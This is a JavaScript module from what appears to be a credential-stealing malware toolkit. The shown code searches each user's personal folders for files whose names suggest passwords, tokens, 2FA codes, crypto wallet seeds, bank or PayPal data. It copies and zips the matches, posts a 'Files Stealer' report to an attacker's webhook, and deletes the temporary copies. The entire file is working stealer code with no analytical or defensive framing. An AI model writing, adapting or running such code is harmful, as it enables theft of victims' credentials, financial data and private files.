const fs = require("fs/promises");
const path = require("path");
const os = require("os");

const requests = require("./../../utils/requests/requests.js");
const fileutil = require("./../../utils/fileutil/fileutil.js");
const hardware = require("./../../utils/hardware/hardware.js");
const program = require("./../../utils/program/program.js");

const keywords = ["compte", "token", "credit", "card", "mail", "address", "phone", "crypto", "exodus", "atomic", "auth", "mfa", "2fa", "code", "memo", "password", "secret", "mdp", "motdepass", "mot_de_pass", "login", "account", "paypal", "banque", "seed", "bancaire", "bank", "metamask", "wallet", "permis", "number", "backup", "database", "config"];

const extensions = [".png", ".gif", ".webp", ".mp4", ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".pdf", ".rtf", ".json", ".csv", ".db", ".jpg", ".jpeg"];

const IsMatchingFile = (fileName) => {
 const lowerCaseName = fileName.toLowerCase();
 return keywords.some((keyword) => lowerCaseName.includes(keyword)) && extensions.some((extension) => lowerCaseName.endsWith(extension));
};

const SearchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
 try {
  const files = await fs.readdir(dir);
  const tasks = files.map(async (file) => {
   const filePath = path.join(dir, file);
   const info = await fs.stat(filePath);

   if (info.isFile() && info.size <= 2 * 1024 * 1024 && IsMatchingFile(file)) {
    const userDir = path.join(commonFilesTempDir, path.basename(dir));
    await fs.mkdir(userDir, { recursive: true });
    const dest = path.join(userDir, `${program.RandString(5)}_${file}`);

    await fileutil.Copy(filePath, dest);
    foundExtensions.add(path.extname(file).toLowerCase());
   } else if (info.isDirectory()) {
    await SearchFiles(filePath, commonFilesTempDir, foundExtensions);
   }
  });

  await Promise.all(tasks);
 } catch (_error) {}
};

module.exports = async (webhookUrl) => {
 const foundExtensions = new Set();
 const users = await hardware.GetUsers();

 for (const user of users) {
  const commonFilesTempDir = path.join(os.tmpdir(), `commonfiles-temp`);
  const destcommonFiles = path.join(commonFilesTempDir, user.split(path.sep)[2]);

  if (
   !(await fs
    .access(destcommonFiles)
    .then(() => true)
    .catch(() => false))
  ) {
   await fs.mkdir(destcommonFiles, { recursive: true });
  }

  const directories = [path.join(user, "Desktop"), path.join(user, "Downloads"), path.join(user, "Documents"), path.join(user, "Videos"), path.join(user, "Pictures"), path.join(user, "Music"), path.join(user, "OneDrive")];

  for (const dir of directories) {
   const dirStats = await fs.stat(dir).catch(() => null);
   if (dirStats && dirStats.isDirectory()) {
    await SearchFiles(dir, destcommonFiles, foundExtensions);
   }
  }

  const commonFilesTempZip = path.join(os.tmpdir(), "commonfiles.zip");

  try {
   await fileutil.ZipDirectory({
    inputDir: commonFilesTempDir,
    outputZip: commonFilesTempZip,
   });

   await requests.Webhook(webhookUrl, {
    embeds: [
     {
      title: "Files Stealer",
      description: "```" + "✅✅✅" + "```",
      fields: [{ name: "Extensions Found", value: "`" + [...foundExtensions].join(", ") + "`" }],
     },
    ],
   });

   const WishTempDir = fileutil.WishTempDir("commonfiles");
   await fileutil.Copy(commonFilesTempDir, WishTempDir);

   [commonFilesTempDir, commonFilesTempZip].forEach(async (dir) => {
    await fileutil.RemoveDir(dir);
   });
  } catch (error) {
   console.error(error);
  }
 }
};
